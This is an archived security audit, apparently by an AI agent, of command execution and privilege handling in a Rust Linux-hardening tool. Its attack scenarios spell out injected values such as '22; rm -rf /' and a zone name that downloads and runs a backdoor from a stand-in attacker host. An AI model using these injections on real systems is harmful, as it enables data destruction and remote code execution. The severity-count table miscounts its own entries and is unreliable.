# Security Audit: Command Execution & Privilege

> **Archived.** Historical record, possibly superseded by later work. Retained for history.

**Domain:** Command Injection, Argument Injection, Privilege Escalation, TOCTOU
**Auditor:** Agent 2 -- Command Execution & Privilege
**Date:** 2026-02-25
**Scope:** All code paths that execute system commands or transition privilege levels

---

## Table of Contents

1. [Validation of Agent 1 Findings](#1-validation-of-agent-1-findings)
2. [New Findings: Command Injection](#2-new-findings-command-injection)
3. [New Findings: Argument Injection](#3-new-findings-argument-injection)
4. [New Findings: Privilege Escalation](#4-new-findings-privilege-escalation)
5. [New Findings: TOCTOU Races](#5-new-findings-toctou-races)
6. [New Findings: Unsafe Shell Invocation](#6-new-findings-unsafe-shell-invocation)
7. [New Findings: Environment and Path Issues](#7-new-findings-environment-and-path-issues)
8. [Summary Table](#8-summary-table)

---

## 1. Validation of Agent 1 Findings

### SA-001: SSH Command Injection via File Paths Containing Single Quotes

- **Agent 1 Assessment:** High severity, CWE-78
- **Agent 2 Verdict:** CONFIRMED -- High severity

**Deep Analysis:**

The vulnerability exists in multiple methods of `SshExecutor`. Every method that constructs shell commands uses single-quote wrapping of file paths via `format!("... '{}' ...", path.display())`:

| Method | Line | Pattern |
|--------|------|---------|
| `read_file` | ssh.rs:105 | `cat '{}'` |
| `read_file_optional` | ssh.rs:116 | `cat '{}' 2>/dev/null` |
| `write_file` | ssh.rs:128 | `sudo tee '{}' > /dev/null` |
| `path_exists` | ssh.rs:143 | `test -e '{}'` |
| `file_metadata` | ssh.rs:150-153 | `stat -c '%F %a %s' '{}'` |

Single-quote escaping in POSIX shells does NOT provide protection against paths containing literal single quotes. A path containing `'` will break the quoting boundary. The correct mitigation is to escape each `'` as `'\''` within the path, or to use the `shell_escape` crate.

**Exploitation scope:** While paths are currently derived from hardcoded constants in plugins (e.g., `/etc/ssh/sshd_config`, `/etc/sysctl.d/99-hardener.conf`), the `SystemExecutor` trait is a public API. Any future plugin or caller that passes user-influenced paths (e.g., from config directives) would inherit this vulnerability. The kernel plugin already uses config directives to construct `/proc/sys/` paths via `param_name.replace('.', "/")` -- if a directive key contained `'`, it would flow through to the SSH executor.

---

### SA-002: SSH execute_command() Concatenates Arguments Without Shell Escaping

- **Agent 1 Assessment:** High severity, CWE-78
- **Agent 2 Verdict:** CONFIRMED -- High severity

**Deep Analysis:**

```rust
// ssh.rs:186-192
async fn execute_command(&self, program: &str, args: &[&str]) -> Result<CommandOutput> {
    let cmd = if args.is_empty() {
        program.to_string()
    } else {
        format!("{} {}", program, args.join(" "))
    };
    self.run_command(&cmd).await
}
```

This concatenates all arguments with spaces and passes them to the remote shell via `session.raw_command(cmd)`. The `openssh` crate's `raw_command()` sends the string as-is to the remote shell for interpretation.

**Current exposure analysis:** I traced every call site that flows through `execute_command()` when the SSH executor is active:

1. **Services plugin** (services/mod.rs): `systemctl` with service names from `UNNECESSARY_SERVICES` (hardcoded, safe)
2. **Audit plugin** (audit/mod.rs): `systemctl`, `augenrules`, `auditctl`, `mkdir` (all hardcoded args, safe)
3. **SSH plugin** (ssh/mod.rs): `systemctl restart sshd`, `service ssh restart`, `cp` (hardcoded, safe)
4. **Permissions plugin** (permissions/mod.rs): `chmod` with mode strings derived from `PermissionDirective.permission_mode` (hardcoded u32 values, safe for now -- but see SA-028 below)
5. **Firewall backends**: `ufw`, `nft`, `firewall-cmd` with rule parameters from `Rule` struct, which can be overridden by config directives (SEE SA-024)
6. **PAM plugin** (pam/mod.rs): `cp` with hardcoded paths (safe)
7. **`command_exists()`**: Passes program name to `which` (safe if program names are hardcoded)

The vulnerability is latent for most call sites because arguments are currently hardcoded. However, the firewall plugin's `apply_rule_directives()` reads port, source, protocol, and action from `config.directives` and passes them into `build_ufw_rule_args()` / `build_nft_rule_args()` which then become arguments to `execute_command()`. This is an exploitable path via SSH executor (see SA-024).

---

### SA-003: SSH write_file() Heredoc Injection

- **Agent 1 Assessment:** High severity, CWE-78
- **Agent 2 Verdict:** CONFIRMED -- High severity, with additional detail

**Deep Analysis:**

```rust
// ssh.rs:126-133
async fn write_file(&self, path: &Path, content: &str) -> Result<()> {
    let cmd = format!(
        "sudo tee '{}' > /dev/null << 'HARDENER_EOF'\n{}\nHARDENER_EOF",
        path.display(),
        content
    );
    // ...
}
```

Two distinct attack vectors here:

1. **Heredoc terminator injection (Agent 1's finding):** If `content` contains `\nHARDENER_EOF\n`, the heredoc terminates early. Subsequent text is interpreted as shell commands running under `sudo tee` context (piped, but further commands after `\n` execute in the shell).

2. **Path injection (overlaps SA-001):** The path is single-quoted, vulnerable to single-quote breakout.

**Practical exposure:** `write_file()` is called by plugins to write configuration content that is partially derived from config directives:

- **Kernel plugin** (kernel/mod.rs:334-337): Writes `sysctl_config_content` which includes `target_value` from `config.directives.get(*param_name)`. A directive value containing `HARDENER_EOF` would trigger the injection.
- **SSH plugin** (ssh/mod.rs:420-426): Writes `config_content` modified by `set_config_directive()` with values from `config.directives`. Same risk.
- **PAM plugin** (pam/mod.rs:304-308): Writes content modified by `apply_directive_to_content()` with values from `config.directives`.
- **Audit plugin** (audit/mod.rs:687-689): Writes `rules_content` with hardcoded audit rule strings (safe).

**Remediation note:** Using a quoted heredoc (`<< 'EOF'`) prevents variable expansion but does NOT prevent early termination by the delimiter string in the content. The only safe approach is to use a dynamically-generated unique delimiter, or to base64-encode the content and decode on the remote side.

---

### SA-017: get_hardener_binary_path() PATH Lookup Could Resolve to Malicious Binary

- **Agent 1 Assessment:** Medium severity, CWE-426
- **Agent 2 Verdict:** CONFIRMED -- Medium severity, with refinement

**Deep Analysis:**

```rust
// commands.rs:106-140
fn get_hardener_binary_path() -> Result<String, String> {
    // 1. Check sibling of current exe
    if let Ok(exe) = std::env::current_exe()
        && exe.with_file_name("hardener").exists()
    {
        return Ok(exe.with_file_name("hardener").to_string_lossy().to_string());
    }

    // 2. In debug mode, check workspace target/debug
    #[cfg(debug_assertions)]
    { /* ... */ }

    // 3. Fall back to PATH lookup
    if std::process::Command::new("which")
        .arg("hardener")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
    {
        return Ok("hardener".to_string());
    }
    // ...
}
```

The PATH fallback (step 3) returns the bare string `"hardener"`, which is then passed to `Command::new("pkexec").arg(&binary)`. When pkexec resolves this, it uses its own PATH lookup, which could differ from the Tauri process's PATH.

**Mitigating factor:** The first check (sibling of current executable) will succeed in production deployments where the Tauri app and CLI are co-located. The PATH fallback only triggers if the sibling binary is missing. However, symlink attacks on the sibling path are possible (see SA-030).

**Additional concern:** Even the sibling check uses `exe.with_file_name("hardener").exists()` followed by a separate call that uses the path. There is a TOCTOU window between the existence check and the actual execution via pkexec (see SA-030).

---

## 2. New Findings: Command Injection

### SA-021: Config Directive Values Flow Unsanitised Into Kernel sysctl Paths

- **ID:** SA-021
- **Severity:** Medium
- **CWE:** CWE-78 (OS Command Injection) / CWE-22 (Path Traversal)
- **Location:** `crates/hardener-plugins/src/kernel/mod.rs:331`
- **Description:** The kernel plugin constructs `/proc/sys/` paths from parameter names: `let path = format!("/proc/sys/{}", param_name.replace('.', "/"))`. The parameter names come from the hardcoded `KERNEL_PARAMS` constant, but the `target_value` written to these paths comes from `config.directives.get(*param_name)` (line 325-328). While the value is written via `write_file()` (not shell-executed for the local executor), on the SSH executor this flows through the heredoc-based `write_file()` (SA-003). Additionally, if a future directive were added where the key itself comes from config, the path construction would be vulnerable to path traversal.
- **Attack Scenario:** An attacker who controls the config file sets a directive value for `kernel.randomize_va_space` to a string containing `HARDENER_EOF\nmalicious_command`. When applied via SSH executor, this achieves command injection on the remote host.
- **Remediation:** Validate directive values against an allowlist of expected formats (numeric for sysctl params). Ensure the SSH `write_file()` uses a safe transport mechanism.
- **Status:** Open

---

### SA-022: SSH Plugin Directive Values Written to sshd_config Without Validation

- **ID:** SA-022
- **Severity:** Medium
- **CWE:** CWE-78 (OS Command Injection via SSH heredoc)
- **Location:** `crates/hardener-plugins/src/ssh/mod.rs:401-405`
- **Description:** The SSH plugin reads target values from `config.directives.get(directive.ssh_directive_name)` and passes them to `set_config_directive()`, which modifies the config content. This modified content is then written to `/etc/ssh/sshd_config` via `ctx.executor().write_file()`. On the SSH executor, content containing the heredoc terminator enables command injection (SA-003 compound). On the local executor, arbitrary sshd_config directives could weaken security (e.g., `PermitRootLogin yes` injected as a directive override).
- **Attack Scenario:** A user (or compromised config file) sets a directive `PermitRootLogin = "yes\nMatch all\nPermitRootLogin yes"`. The `set_config_directive()` function would inject multiline content into sshd_config, potentially overriding security settings. Via SSH executor, the heredoc injection applies as well.
- **Remediation:** Validate all directive values are single-token values matching expected sshd_config syntax (no newlines, no shell metacharacters). Reject directive values containing newline characters.
- **Status:** Open

---

### SA-023: PAM Directive Values Written Without Validation

- **ID:** SA-023
- **Severity:** Medium
- **CWE:** CWE-78 (OS Command Injection via SSH heredoc) / CWE-94 (Code Injection)
- **Location:** `crates/hardener-plugins/src/pam/mod.rs:296-300`
- **Description:** The PAM plugin reads target values from `config.directives.get(directive.pam_directive_name)` and passes them to `apply_directive_to_content()`. The resulting content is written to `/etc/security/pwquality.conf` and `/etc/login.defs`. No validation is performed on the directive value. A value containing newlines could inject additional config directives. Via SSH executor, the heredoc injection path applies.
- **Attack Scenario:** A directive value `"14\nminclass = 0"` for `minlen` would inject a second directive that weakens password complexity. The `apply_directive_to_content()` function does not sanitise newlines in the value.
- **Remediation:** Validate directive values are single-line and match expected numeric/string patterns for each PAM parameter.
- **Status:** Open

---

### SA-024: Firewall Rule Parameters From Config Directives Pass to Shell Commands

- **ID:** SA-024
- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-plugins/src/firewall/mod.rs:154-167` (apply_rule_directives), `ufw.rs:91-123` (build_ufw_rule_args), `nftables.rs:108-156` (build_nft_rule_args)
- **Description:** The `apply_rule_directives()` function reads port, source, protocol, and action values from `config.directives` and injects them directly into the `Rule` struct fields. These fields are then used to construct command arguments for `ufw`, `nft`, and `firewall-cmd`. For the local executor, these are passed as separate `Command::arg()` arguments (safe against injection). However, for the SSH executor, they are concatenated into a single shell command string (SA-002), enabling command injection.
- **Attack Scenario:** A config directive `ssh.port = "22; rm -rf /"` is read by `apply_rule_directives()` into `rule.rule_port`. When `build_ufw_rule_args()` constructs `["allow", "to", "any", "port", "22; rm -rf /", "proto", "tcp"]` and this is passed through the SSH executor's `execute_command()` which joins with spaces, the shell interprets the semicolon as a command separator.
- **Remediation:** Validate all firewall rule parameters against strict patterns (port: numeric or range, source: valid CIDR, protocol: enum, action: enum). Apply validation in `apply_rule_directives()` before storing values.
- **Status:** Open

---

### SA-025: Firewalld Zone Name From Runtime Query Used in Shell Commands

- **ID:** SA-025
- **Severity:** Low
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-plugins/src/firewall/firewalld.rs:47-52, 129, 164, 183`
- **Description:** The `get_default_zone()` method reads the zone name from `firewall-cmd --get-default-zone` output and uses it as an argument in subsequent `firewall-cmd` calls. For the local executor this is safe (separate args). For the SSH executor, a maliciously-configured remote host could return a zone name containing shell metacharacters.
- **Attack Scenario:** A compromised remote host returns a zone name like `public; wget attacker.com/backdoor -O /tmp/x && chmod +x /tmp/x && /tmp/x` from `firewall-cmd --get-default-zone`. This is used in `execute_firewall_cmd(ctx, &["--zone", &zone, "--list-services"])` which, via SSH executor, concatenates into a single command string.
- **Remediation:** Validate the zone name matches `^[a-zA-Z0-9_-]+$` before using it in commands.
- **Status:** Open

---

## 3. New Findings: Argument Injection

### SA-026: Plugin IDs From GUI Passed as CLI Arguments Via pkexec Without Validation

- **ID:** SA-026
- **Severity:** Medium
- **CWE:** CWE-88 (Argument Injection)
- **Location:** `src-tauri/src/commands.rs:349-386` (run_apply)
- **Description:** The `run_apply` Tauri command receives `plugin_ids: Vec<String>` from the WASM frontend and passes them directly as `--plugin <id>` arguments to the CLI via pkexec. No validation is performed on the plugin ID strings before they become command-line arguments to a root-level process. A plugin ID starting with `--` could inject additional CLI flags.
- **Attack Scenario:** A compromised frontend sends `plugin_ids: ["--config", "/tmp/evil.toml", "kernel"]`. The args would become: `["apply", "--format", "json", "--plugin", "--config", "--plugin", "/tmp/evil.toml", "--plugin", "kernel"]`. While clap's strict parsing may reject this specific example, other flag injections could alter behaviour. More critically, a value like `--all` would bypass the plugin filter entirely.
- **Remediation:** Validate plugin IDs against the known set of registered plugin IDs before constructing CLI arguments. Reject any ID containing `--` prefix or shell metacharacters. Use `--` argument terminator before user-supplied values.
- **Status:** Open

---

### SA-027: Checkpoint ID From GUI Passed to pkexec Without Validation

- **ID:** SA-027
- **Severity:** Medium
- **CWE:** CWE-88 (Argument Injection)
- **Location:** `src-tauri/src/commands.rs:452-471` (run_rollback), `src-tauri/src/commands.rs:561` (delete_checkpoint)
- **Description:** The `run_rollback` and `delete_checkpoint` Tauri commands receive checkpoint IDs from the frontend and pass them directly as CLI arguments to pkexec. A malicious checkpoint ID starting with `--` could inject CLI flags into the root-level process.
- **Attack Scenario:** A compromised frontend sends `checkpoint_id: "--format\ntext\n--help"`. This could alter the command's parsing behaviour. More practically, `checkpoint_id: "--all"` in a differently-structured command could trigger unintended operations.
- **Remediation:** Validate checkpoint IDs match the expected UUID/timestamp format. Use `--` terminator before positional arguments.
- **Status:** Open

---

### SA-028: Checkpoint Name From GUI Passed to pkexec Without Sanitisation

- **ID:** SA-028
- **Severity:** Medium
- **CWE:** CWE-88 (Argument Injection)
- **Location:** `src-tauri/src/commands.rs:526-541` (create_checkpoint)
- **Description:** The `create_checkpoint` Tauri command receives a `name: String` from the frontend and passes it directly as a CLI argument: `["checkpoint", "create", "--format", "json", &name]`. A name starting with `--` could inject CLI flags.
- **Attack Scenario:** A name like `"--format\x00text"` or `"--help"` could alter command behaviour. While clap may reject unexpected arguments, the name is a positional arg and could be confused with flags if it starts with `-`.
- **Remediation:** Validate the checkpoint name does not start with `-`. Consider using `--` before the positional name argument.
- **Status:** Open

---

### SA-029: Permissions Plugin Config Directive Allows Arbitrary Mode Values

- **ID:** SA-029
- **Severity:** Low
- **CWE:** CWE-20 (Improper Input Validation)
- **Location:** `crates/hardener-plugins/src/permissions/mod.rs:355-358`
- **Description:** The permissions plugin reads a mode override from `config.directives.get(directive.permission_path)` and parses it via `u32::from_str_radix(mode_str, 8)`. If parsing fails, it falls back to the default. However, any valid octal value is accepted, including insecure modes like `0777`. This allows a config directive to set world-writable permissions on critical system paths like `/etc/sudoers`.
- **Attack Scenario:** A malicious config file sets directive `/etc/sudoers = "777"`. The permissions plugin would `chmod 0777 /etc/sudoers`, making it world-writable. When `chmod` is executed via the SSH executor, the mode string flows through `execute_command()` which concatenates args. A mode string like `0777 /tmp/evil` could inject an additional path argument on SSH.
- **Remediation:** Validate that the parsed mode does not grant more permissions than the baseline. Reject modes that are more permissive than the default.  Validate mode strings match `^[0-7]{3,4}$`.
- **Status:** Open

---

## 4. New Findings: Privilege Escalation

### SA-030: TOCTOU Between Binary Path Resolution and pkexec Execution

- **ID:** SA-030
- **Severity:** Medium
- **CWE:** CWE-367 (TOCTOU Race Condition)
- **Location:** `src-tauri/src/commands.rs:106-140` (get_hardener_binary_path), `src-tauri/src/commands.rs:186` (run_privileged_command)
- **Description:** `get_hardener_binary_path()` checks if a binary exists at a path (line 109: `exe.with_file_name("hardener").exists()`), then later `run_privileged_command()` passes that path to pkexec (line 186). There is a time window between the existence check and the pkexec invocation during which the binary could be replaced (e.g., via symlink manipulation). Since pkexec runs the binary as root, a replaced binary achieves root code execution.
- **Attack Scenario:** An attacker with write access to the directory containing the hardener binary replaces it with a malicious binary between the `exists()` check and the pkexec invocation. The user authenticates via polkit, and the malicious binary runs as root.
- **Remediation:** Resolve the binary path to a canonical absolute path, verify it is owned by root and not world-writable, and pass the absolute path to pkexec. Ideally, the polkit policy should specify the exact binary path, not allow arbitrary binaries.
- **Status:** Open

---

### SA-031: Config Path From GUI Influences Root-Level File Operations

- **ID:** SA-031
- **Severity:** Medium
- **CWE:** CWE-22 (Path Traversal) / CWE-269 (Improper Privilege Management)
- **Location:** `src-tauri/src/commands.rs:368-373` (run_apply config_path injection), `src-tauri/src/commands.rs:414-419` (run_apply_dry_run), `src-tauri/src/commands.rs:459-464` (run_rollback)
- **Description:** The `config_path` parameter from the Tauri IPC call is passed directly as `--config <path>` to the pkexec-elevated CLI process. The root process then reads this file and uses its contents (directives, exceptions, disabled plugins) to determine what system changes to make. No validation is performed on the path. This is the same as Agent 1's SA-008 but expanded with additional detail from this audit.
- **Attack Scenario:** (1) A compromised WASM frontend sends `config_path: "/tmp/evil.toml"` containing directives that weaken all security settings (e.g., `PermitRootLogin = "yes"`, exceptions for all plugins). The user authenticates via polkit without seeing the config contents. (2) Path traversal: `config_path: "/proc/self/environ"` could cause the TOML parser to error, but a carefully crafted path could point to a world-readable file that happens to be valid TOML.
- **Remediation:** Validate the config path points to a regular file owned by root or the current user. Restrict to known config directories. Display the config file path in the polkit authentication prompt so the user can verify it.
- **Status:** Open

---

### SA-032: Dry-Run Command Runs Without pkexec But Can Trigger File Reads as User

- **ID:** SA-032
- **Severity:** Low
- **CWE:** CWE-269 (Improper Privilege Management)
- **Location:** `src-tauri/src/commands.rs:392-445` (run_apply_dry_run)
- **Description:** The dry-run command runs the CLI binary directly (without pkexec) because it is "read-only". However, the CLI binary path is user-controlled (SA-017/SA-030 apply), and the `--config` path is user-controlled (SA-031 applies). While the CLI's `apply.rs` checks `!nix::unistd::geteuid().is_root() && !dry_run` and would bail on non-dry-run without root, the dry-run path still executes plugin `validate()` methods which read system files. An attacker could use this to probe file existence and readability.
- **Attack Scenario:** Minor information disclosure: the dry-run response includes validation issues that reveal whether certain system files exist and their permissions, even without root.
- **Remediation:** This is low risk because the information exposed is limited to file existence checks. Consider whether dry-run should use a restricted executor.
- **Status:** Open

---

## 5. New Findings: TOCTOU Races

### SA-033: Permissions Plugin Check-Then-Act on File Permissions

- **ID:** SA-033
- **Severity:** Low
- **CWE:** CWE-367 (TOCTOU Race Condition)
- **Location:** `crates/hardener-plugins/src/permissions/mod.rs:196-209`
- **Description:** The `apply_path_permissions()` function first calls `path_exists()`, then `file_metadata()` to read current permissions, then `execute_command("chmod", ...)` to change them. Between the metadata read and the chmod, the file could be replaced (e.g., by a symlink to a different file). The chmod would then apply to the symlink target.
- **Attack Scenario:** An attacker races between the metadata read and chmod, replacing `/etc/sudoers.d` with a symlink to `/etc/shadow`. The chmod changes permissions on `/etc/shadow` instead. This requires local root access or write to the parent directory, limiting practical exploitation.
- **Remediation:** Use `fchmod()` on an open file descriptor rather than path-based `chmod`. Alternatively, verify the inode has not changed between the check and the action.
- **Status:** Open

---

### SA-034: SSH Plugin Backup-Then-Write Race on sshd_config

- **ID:** SA-034
- **Severity:** Low
- **CWE:** CWE-367 (TOCTOU Race Condition)
- **Location:** `crates/hardener-plugins/src/ssh/mod.rs:334-378`
- **Description:** The SSH plugin creates a backup via `cp -p`, then reads the file, modifies it in memory, and writes it back. Between the backup and the write, the file could be modified by another process (e.g., another SSH session editing sshd_config). The backup would be inconsistent with what was overwritten.
- **Attack Scenario:** Another administrator modifies sshd_config between the backup and the write. The backup contains the old state, but the overwritten file loses the concurrent modification. This is an operational concern more than a security vulnerability.
- **Remediation:** Use file locking (e.g., `flock`) or atomic write-and-rename. The checkpoint system provides a safety net, but the immediate backup could still be inconsistent.
- **Status:** Open

---

### SA-035: LocalExecutor write_file() Non-Atomic Write

- **ID:** SA-035
- **Severity:** Low
- **CWE:** CWE-367 (TOCTOU Race Condition)
- **Location:** `crates/hardener-core/src/executor/local.rs:41-43`
- **Description:** `LocalExecutor::write_file()` uses `std::fs::write(path, content)` which is not atomic. If the process is interrupted during the write (crash, signal, power failure), the file may be left in a partially-written state, potentially corrupting critical configuration files like sshd_config or sysctl.conf.
- **Attack Scenario:** A power failure during `write_file()` to `/etc/ssh/sshd_config` leaves the file truncated. SSH service fails to start after reboot, potentially locking out the administrator.
- **Remediation:** Use the existing `update_file_atomically()` from `hardener-common/src/file_utils.rs` which writes to a temp file and performs an atomic rename. This function exists but is not used by `LocalExecutor::write_file()`.
- **Status:** Open

---

## 6. New Findings: Unsafe Shell Invocation

### SA-036: SSH Executor Uses Shell Interpretation for All Commands

- **ID:** SA-036
- **Severity:** High (architectural)
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:73-86` (run_command)
- **Description:** All SSH executor operations use `session.raw_command(cmd)` which sends the command string to the remote shell for interpretation. This is the root cause of SA-001, SA-002, and SA-003. The `openssh` crate provides `session.command(program).arg(arg)` which handles argument escaping properly, but it is not used anywhere. Every method in `SshExecutor` manually constructs shell command strings.
- **Attack Scenario:** This is the architectural vulnerability that enables all SSH-related injection attacks. Any data that flows into any SSH command string is subject to shell interpretation.
- **Remediation:** Replace `session.raw_command(cmd)` with `session.command(program).arg(arg1).arg(arg2)...` for `execute_command()`. For file operations (`read_file`, `write_file`, etc.), use SFTP via the `openssh-sftp-client` crate instead of shell commands, or at minimum use `session.command("cat").arg(path)` instead of `format!("cat '{}'", path)`.
- **Status:** Open

---

### SA-037: SSH write_file() Uses sudo tee Without Validating sudo Availability

- **ID:** SA-037
- **Severity:** Informational
- **CWE:** CWE-271 (Privilege Dropping / Elevation Errors)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:126-133`
- **Description:** The SSH `write_file()` method always uses `sudo tee` for writes. If the remote user already has root access (e.g., connecting as root), the `sudo` prefix is unnecessary. If the remote user does not have passwordless sudo, the command will hang waiting for a password (SSH session is non-interactive). There is no mechanism to configure or detect whether sudo is needed.
- **Attack Scenario:** Not a direct vulnerability, but an operational issue. If sudo requires a password, write operations silently hang until timeout, causing confusing failures.
- **Remediation:** Check if the remote user is root (`id -u` == 0) and omit `sudo` when not needed. For non-root users, verify sudo is available and passwordless before attempting writes.
- **Status:** Open

---

## 7. New Findings: Environment and Path Issues

### SA-038: LocalExecutor execute_command() Inherits Full Environment

- **ID:** SA-038
- **Severity:** Low
- **CWE:** CWE-426 (Untrusted Search Path)
- **Location:** `crates/hardener-core/src/executor/local.rs:70-81`
- **Description:** `LocalExecutor::execute_command()` uses `Command::new(program).args(args).output()` which inherits the full environment of the calling process. When the CLI runs as root via pkexec, the environment includes the original user's PATH, LD_LIBRARY_PATH, and other variables that could influence command behaviour. Programs like `sysctl`, `systemctl`, `chmod`, `cp` are invoked by bare name, relying on PATH resolution.
- **Attack Scenario:** An attacker sets `PATH=/tmp/evil:$PATH` before launching the GUI. Pkexec preserves some environment variables (depending on polkit configuration). If PATH is preserved, `Command::new("sysctl")` could resolve to `/tmp/evil/sysctl`. Note: most pkexec implementations sanitise PATH, but this is configuration-dependent.
- **Remediation:** Use absolute paths for all system commands (e.g., `/usr/bin/systemctl`, `/usr/sbin/sysctl`). Alternatively, explicitly set a sanitised PATH via `Command::env("PATH", "/usr/sbin:/usr/bin:/sbin:/bin")`.
- **Status:** Open

---

### SA-039: Package Manager Commands Use Bare Names Without Absolute Paths

- **ID:** SA-039
- **Severity:** Low
- **CWE:** CWE-426 (Untrusted Search Path)
- **Location:** `crates/hardener-distro/src/package/mod.rs:72` (execute_command), `apt.rs:36`, `dnf.rs:23`, `pacman.rs:30`, `zypper.rs:30`
- **Description:** All package manager implementations use bare command names (`apt-get`, `dnf`, `pacman`, `zypper`, `dpkg-query`, `rpm`) via `std::process::Command::new(command)`. These resolve via PATH. Since package manager operations require root, the same environment inheritance concerns as SA-038 apply.
- **Attack Scenario:** Same as SA-038. A malicious PATH entry could redirect package manager commands to attacker-controlled binaries running as root.
- **Remediation:** Use absolute paths for all package manager binaries. The paths are well-known and consistent across distributions (e.g., `/usr/bin/apt-get`, `/usr/bin/dnf`).
- **Status:** Open

---

### SA-040: systemd install Command Uses HOME Environment Variable for Path Construction

- **ID:** SA-040
- **Severity:** Low
- **CWE:** CWE-426 (Untrusted Search Path) / CWE-22 (Path Traversal)
- **Location:** `crates/hardener-cli/src/commands/systemd.rs:75-76`
- **Description:** The `install()` function for user-mode systemd units reads `std::env::var("HOME")` to construct the unit directory: `PathBuf::from(home).join(".config/systemd/user")`. The HOME variable can be spoofed. When running under pkexec, HOME may be set to the original user's home directory rather than root's.
- **Attack Scenario:** An attacker sets `HOME=/tmp/evil` before the command runs. The systemd unit files are written to `/tmp/evil/.config/systemd/user/`, a directory controlled by the attacker. The attacker could pre-populate this directory with malicious unit files that get loaded by systemd.
- **Remediation:** For user-mode installation, resolve the home directory from `/etc/passwd` via `nix::unistd::User::from_uid()` instead of the HOME environment variable.
- **Status:** Open

---

### SA-041: SSH Executor command_exists() Can Be Spoofed by Remote Host

- **ID:** SA-041
- **Severity:** Informational
- **CWE:** CWE-807 (Reliance on Untrusted Inputs in a Security Decision)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:195-198`
- **Description:** `command_exists()` runs `which <program>` on the remote host. The result influences which firewall backend is selected, whether auditd operations proceed, and other plugin decisions. A compromised remote host could return false positives (claiming a tool exists when it does not) or false negatives, causing plugins to skip security operations or select inappropriate backends.
- **Attack Scenario:** A compromised remote host has a malicious `which` command that always returns success. The firewall plugin selects an incorrect backend, and subsequent firewall commands fail silently or apply rules incorrectly.
- **Remediation:** This is inherent to remote scanning -- the remote host is partially trusted. Document this trust assumption. Consider verifying tool availability by running the tool with a safe flag (e.g., `nft --version`) rather than relying on `which`.
- **Status:** Open

---

## 8. Summary Table

| ID | Severity | CWE | Category | Location | Description |
|----|----------|-----|----------|----------|-------------|
| SA-001 | High | CWE-78 | Command Injection | executor/ssh.rs:105+ | Single-quote breakout in SSH file path quoting |
| SA-002 | High | CWE-78 | Command Injection | executor/ssh.rs:186-192 | SSH execute_command() joins args without escaping |
| SA-003 | High | CWE-78 | Command Injection | executor/ssh.rs:126-133 | SSH write_file() heredoc terminator injection |
| SA-017 | Medium | CWE-426 | Privilege Escalation | commands.rs:106-140 | PATH fallback for hardener binary |
| SA-021 | Medium | CWE-78 | Command Injection | kernel/mod.rs:331 | Config directive values flow to SSH write_file() |
| SA-022 | Medium | CWE-78 | Command Injection | ssh/mod.rs:401-405 | SSH plugin directive values to sshd_config via heredoc |
| SA-023 | Medium | CWE-78 | Command Injection | pam/mod.rs:296-300 | PAM directive values to config files via heredoc |
| SA-024 | High | CWE-78 | Command Injection | firewall/mod.rs:154-167 | Config directives flow to firewall shell commands |
| SA-025 | Low | CWE-78 | Command Injection | firewall/firewalld.rs:47-52 | Zone name from remote host used in commands |
| SA-026 | Medium | CWE-88 | Argument Injection | commands.rs:349-386 | Plugin IDs from GUI to pkexec args unsanitised |
| SA-027 | Medium | CWE-88 | Argument Injection | commands.rs:452-471 | Checkpoint ID from GUI to pkexec args unsanitised |
| SA-028 | Medium | CWE-88 | Argument Injection | commands.rs:526-541 | Checkpoint name from GUI to pkexec args unsanitised |
| SA-029 | Low | CWE-20 | Input Validation | permissions/mod.rs:355-358 | Arbitrary octal mode from config directives |
| SA-030 | Medium | CWE-367 | TOCTOU | commands.rs:106-140,186 | Binary path check/use race in pkexec path |
| SA-031 | Medium | CWE-22 | Privilege Escalation | commands.rs:368-373 | Config path from GUI to root process unsanitised |
| SA-032 | Low | CWE-269 | Privilege | commands.rs:392-445 | Dry-run reveals system file metadata |
| SA-033 | Low | CWE-367 | TOCTOU | permissions/mod.rs:196-209 | Race between metadata read and chmod |
| SA-034 | Low | CWE-367 | TOCTOU | ssh/mod.rs:334-378 | Race between backup and config write |
| SA-035 | Low | CWE-367 | TOCTOU | executor/local.rs:41-43 | Non-atomic write_file() can corrupt configs |
| SA-036 | High | CWE-78 | Architecture | executor/ssh.rs:73-86 | All SSH ops use shell-interpreted raw commands |
| SA-037 | Info | CWE-271 | Privilege | executor/ssh.rs:126-133 | sudo tee used unconditionally |
| SA-038 | Low | CWE-426 | Environment | executor/local.rs:70-81 | Commands inherit unsanitised environment |
| SA-039 | Low | CWE-426 | Environment | package/mod.rs:72 | Package manager commands use bare names |
| SA-040 | Low | CWE-22 | Environment | systemd.rs:75-76 | HOME env var used for path construction |
| SA-041 | Info | CWE-807 | Trust Model | executor/ssh.rs:195-198 | Remote command_exists() can be spoofed |

### Severity Distribution

| Severity | Count |
|----------|-------|
| High | 5 (SA-001, SA-002, SA-003, SA-024, SA-036) |
| Medium | 8 (SA-017, SA-021, SA-022, SA-023, SA-026, SA-027, SA-028, SA-030, SA-031) |
| Low | 7 (SA-025, SA-029, SA-032, SA-033, SA-034, SA-035, SA-038, SA-039, SA-040) |
| Informational | 2 (SA-037, SA-041) |

### Priority Remediation Order

1. **SA-036** (arch): Migrate SSH executor from `raw_command()` to `session.command().arg()` -- fixes SA-001, SA-002, SA-024, SA-025 simultaneously
2. **SA-003**: Fix SSH `write_file()` heredoc injection -- use SFTP or base64 transport -- fixes SA-021, SA-022, SA-023 simultaneously
3. **SA-026/SA-027/SA-028**: Add input validation for all data crossing the Tauri-to-pkexec boundary
4. **SA-031**: Validate config path before passing to pkexec
5. **SA-030**: Resolve binary to canonical absolute path, verify ownership
6. **SA-035**: Switch LocalExecutor to atomic writes
7. **SA-038/SA-039**: Use absolute paths for system commands
8. **SA-029**: Validate permission mode directives
9. **SA-040**: Use passwd lookup instead of HOME env var
